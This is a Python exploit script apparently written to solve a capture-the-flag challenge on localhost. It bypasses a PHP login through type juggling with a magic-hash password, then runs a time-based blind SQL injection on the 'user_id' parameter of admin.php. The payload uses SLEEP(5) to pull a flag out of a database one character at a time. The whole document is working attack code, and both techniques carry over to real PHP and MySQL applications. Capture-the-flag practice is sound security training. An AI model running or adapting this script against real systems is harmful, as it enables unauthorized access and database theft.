import requests
import time

# Base URL of the CTF challenge
base_url = "http://localhost:8080"

# 1. Login bypass using PHP Type Juggling vulnerability
login_url = f"{base_url}/login.php"

# Credentials
username = "admin"
password = "TyNOQHUS"  # This password produces a suitable md5 hash for type juggling

# Login POST data
login_data = {
    "username": username,
    "password": password
}

# Start a session to maintain cookies (important for authenticated requests)
session = requests.Session()

# Send login request
login_response = session.post(login_url, data=login_data)

# Check if login was successful (by checking redirection or response content)
if "admin.php" in login_response.url:
    print("[+] Login successful, type juggling exploit worked!")
else:
    print("[-] Login failed, type juggling exploit did not work.")
    exit()

# 2. Time-based Blind SQL Injection to retrieve the flag
admin_url = f"{base_url}/admin.php"

# We're going to use the SQL injection in the user_id parameter to retrieve the flag
# Assumption: the flag is in a table `flags`, in a column `flag`.

flag = ""
flag_length = 30  # Assume the flag length is 30 characters

# Characters to test
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'

print("[+] Starting Time-Based Blind SQL Injection to extract the flag...")

for position in range(1, flag_length + 1):
    for char in characters:
        # Payload to inject in the user_id parameter
        payload = f"1 AND IF(SUBSTRING((SELECT flag FROM flags WHERE id=1), {position}, 1) = '{char}', SLEEP(5), 0)"
        
        # Record the time before making the request
        start_time = time.time()
        
        # Send request with the SQL injection payload
        injection_response = session.get(admin_url, params={'user_id': payload})
        
        # Record the response time
        response_time = time.time() - start_time
        
        # If the response time is greater than 5 seconds, we found the correct character
        if response_time > 5:
            flag += char
            print(f"[+] Found character {char} at position {position} | Flag so far: {flag}")
            break

# Output the final flag
print(f"[+] Flag retrieved: {flag}")

